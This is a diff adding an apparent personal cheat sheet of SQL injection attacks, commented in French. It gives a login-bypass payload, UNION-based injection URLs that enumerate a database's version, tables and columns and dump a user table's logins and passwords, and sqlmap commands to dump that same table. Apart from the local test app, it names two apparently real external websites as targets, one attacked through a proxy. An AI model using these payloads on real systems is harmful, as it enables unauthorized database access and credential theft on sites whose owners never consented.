@@ -1,0 +1,58 @@
+//login
+admin ' or true /*
+passe */ or ''='
+
+
+
+//test si vulnerable
+http://localhost/appListPersonel/index.php?id=1 '
+
+
+//lire nombre des colonne
+http://localhost/appListPersonel/index.php?id=1 order by 3
+
+
+//get mysql version
+http://localhost/appListPersonel/index.php?id=1 union all select 1,convert(@@version using latin1),3,4,5
+
+//get database name 
+http://localhost/appListPersonel/index.php?id=1 union all select 1,version(),DATABASE(),4,5
+
+//if v < 5 il faut tenter si no
+
+//listes des tables db
+http://localhost/appListPersonel/index.php?id=1 union all select 1,table_name,3,4,5 from information_schema.tables where TABLE_SCHEMA = 'boutique'
+
+--- union all select 1,table_name,3 ,4,5  FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'cobranetdb' AND table_name = '3d_images'
+
+// liste des colonne de la table utilisateur
+http://localhost/appListPersonel/index.php?id=1 union all select 1,table_name,COLUMN_NAME,4,5 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'boutique' AND TABLE_NAME = 'utilisateur';
+
+
+http://localhost/appListPersonel/index.php?id=1 union all select 1,login,pass ,4,5  FROM utilisateur 
+
+
+
+ex 
+
+ http://www.calidus.ro/en/news.php?id=2
+ http://www.cobranet.org/about.php?id=1
+ 
+ union all select 1 as pos,2,3 ,4,5,6 
+ 
+ 
+ ///SQLMAP
+ pyton path  --->   C:\Python27
+ 
+ python sqlmap.py -u "localhost/appListPersonel/index.php?id=1"
+ 
+ python sqlmap.py -u "localhost/appListPersonel/index.php?id=1" --dbs
+ 
+python sqlmap.py -u "localhost/appListPersonel/index.php?id=1" --tables -D boutique
+																
+python sqlmap.py -u "localhost/appListPersonel/index.php?id=1" --columns -D boutique -T utilisateur
+																
+python sqlmap.py -u "localhost/appListPersonel/index.php?id=1" --dump -D boutique -T utilisateur
+																
+	// proxy
+  python sqlmap.py -u "http://www.cobranet.org/about.php?id=1"  --proxy="http://10.10.17.1:3128"  --dbs	
